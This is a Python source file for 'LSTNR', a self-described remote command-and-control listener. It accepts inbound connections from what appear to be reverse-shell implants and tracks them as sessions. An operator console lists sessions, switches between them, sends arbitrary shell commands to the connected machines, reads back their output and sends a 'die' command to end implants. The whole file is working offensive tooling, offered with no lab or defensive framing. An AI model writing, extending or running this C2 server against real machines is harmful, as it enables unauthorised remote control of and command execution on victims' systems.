import asyncio
import sys
import argparse
import logging
import aioconsole
import signal

# Global variables
sessions = {}
session_counter = 1
current_session_id = None
server = None  # Keep track of the server instance

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', handlers=[
    logging.FileHandler("lstnr.log"),
])

def parse_arguments():
    parser = argparse.ArgumentParser(description='LSTNR - Remote Command & Control')
    parser.add_argument('-p', '--port', type=int, required=True, help='Port to listen on')
    return parser.parse_args()

async def shutdown():
    """ Immediately close all sessions and shut down the listener. """
    global server
    logging.info("[!] Shutting down listener...")
    print("\n[!] Shutting down listener...")

    # Send "die" command to all connected clients
    for session_id, session in list(sessions.items()):
        try:
            session['writer'].write(b"die\n")
            await session['writer'].drain()  # Flush output buffer
            session['writer'].close()  # Close socket
        except Exception as e:
            logging.error(f"Error closing session {session_id} ({session['ip']}): {e}")

    sessions.clear()  # Remove all session references

    if server:
        server.close()

    print("[+] Listener shut down immediately.")
    sys.exit(0)  # Force immediate exit


def handle_sigint():
    """ Handle Ctrl+C and ask the user to type 'kill-lstnr' instead. """
    print("\n[!] Ctrl+C detected. Please type 'kill-lstnr' to properly terminate all sessions and exit.")

async def handle_client(reader, writer):
    global session_counter, sessions
    addr = writer.get_extra_info('peername')
    client_ip = addr[0]

    try:
        logging.info(f"[+] New connection from {client_ip}")
        
        session_id = session_counter
        sessions[session_id] = {
            'ip': client_ip,
            'writer': writer,
            'reader': reader,
            'active': False  
        }
        session_counter += 1

        logging.info(f"[+] Session {session_id} initialized: Session {session_id} - {client_ip}")

        while True:
            await asyncio.sleep(0.1)
    except Exception as e:
        logging.error(f"[!] Error: {e}")
    finally:
        session_to_remove = next((sid for sid, s in sessions.items() if s['writer'] == writer), None)
        if session_to_remove:
            del sessions[session_to_remove]
            logging.info(f"[-] Session {session_to_remove} disconnected.")

        writer.close()
        await writer.wait_closed()

async def input_prompt():
    """ Handles user commands in the main loop. """
    global current_session_id
    while True:
        RED = "\033[91m"
        BLUE = "\033[94m"
        GREEN = "\033[92m"
        YELLOW = "\033[93m"
        RESET = "\033[0m"  # Reset to default color

        command = await aioconsole.ainput(f"{BLUE}lstnr -> {RESET}") 
        #command = await aioconsole.ainput("lstnr -> ")  

        if not command:
            continue

        if command.lower() in ['list-sessions', 'ls']:
            print("\n+----------------------+")
            print("| ID | IP ADDRESS      |")
            print("+----------------------+")
            for sid, session in sessions.items():
                print(f"| {sid}  | {session['ip']:<14}  |")
            print("+----------------------+\n")

        elif command.lower() in ['kill-lstnr', 'exit']:
            await shutdown()

        elif command.lower().startswith('connect-session') or command.lower().startswith('cs'):
            try:
                session_id_to_connect = int(command.split()[1])
                if session_id_to_connect in sessions:
                    session = sessions[session_id_to_connect]
                    logging.info(f"[+] Connecting to session {session_id_to_connect}...")
                    session['active'] = True
                    current_session_id = session_id_to_connect
                    writer, reader = session['writer'], session['reader']

                    while True:
                        BLUE = "\033[94m"
                        RESET = "\033[0m"

                        cmd_input = await aioconsole.ainput(f"{RED}{session_id_to_connect}@{session['ip']} > {RESET}")

                        #cmd_input = await aioconsole.ainput(f"{session_id_to_connect}@{session['ip']} > ")  
                        cmd = cmd_input.strip()

                        if not cmd:
                            continue

                        if cmd.lower() in ['bg-session', 'bs']:
                            session['active'] = False
                            current_session_id = None
                            break

                        if cmd.lower() in ['kill-session', 'ks']:
                            writer.write(b"die\n")
                            await writer.drain()
                            del sessions[session_id_to_connect]
                            current_session_id = None
                            break

                        writer.write(f"{cmd}\n".encode())
                        await writer.drain()

                        response = ""
                        while True:
                            chunk = await reader.read(4096)
                            if not chunk:
                                break
                            response += chunk.decode('utf-8')
                            if response.strip().endswith("EOF"):
                                response = response.replace("EOF", "").strip()
                                break
                        print(response)
                else:
                    print(f"[-] Session {session_id_to_connect} not found.")
            except ValueError:
                print("[-] Invalid session ID.")

        elif command.lower().startswith('kill-session') or command.lower().startswith('ks'):
            try:
                session_id_to_kill = int(command.split()[1])
                if session_id_to_kill in sessions:
                    session = sessions[session_id_to_kill]
                    session['writer'].write(b"die\n")
                    await session['writer'].drain()
                    del sessions[session_id_to_kill]
                    print(f"[!] Session {session_id_to_kill} terminated.")
                else:
                    print(f"[-] Session {session_id_to_kill} not found.")
            except ValueError:
                print("[-] Invalid session ID.")

        elif command.lower() in ['help', '?']:
            print("""
Commands:
    ls, list-sessions       : Show active sessions.
    cs <id>, connect-session <id> : Connect to a session.
    bs, bg-session          : Background the active session.
    ks <id>, kill-session <id>   : Kill a specific session.
    kill-lstnr, exit        : Stop the listener and close sessions.
    help, ?                 : Show available commands.
            """)

        else:
            print("[*] Invalid command. Type 'help' for available commands.")

async def start_server(port):
    """ Start the async server. """
    global server
    print(""" 
    ██╗     ███████╗████████╗███╗   ██╗██████╗ 
    ██║     ██╔════╝╚══██╔══╝████╗  ██║██╔══██╗
    ██║     ███████╗   ██║   ██╔██╗ ██║██████╔╝
    ██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
    ███████╗███████║   ██║   ██║ ╚████║██║  ██║
    ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
    Remote Command & Control - v1.2
    """)

    loop = asyncio.get_running_loop()
    loop.add_signal_handler(signal.SIGINT, handle_sigint)  

    server = await asyncio.start_server(handle_client, '0.0.0.0', port)
    print(f"[*] LSTNR running on port {port}")
    await asyncio.gather(server.serve_forever(), input_prompt())

if __name__ == "__main__":
    args = parse_arguments()
    asyncio.run(start_server(args.port))
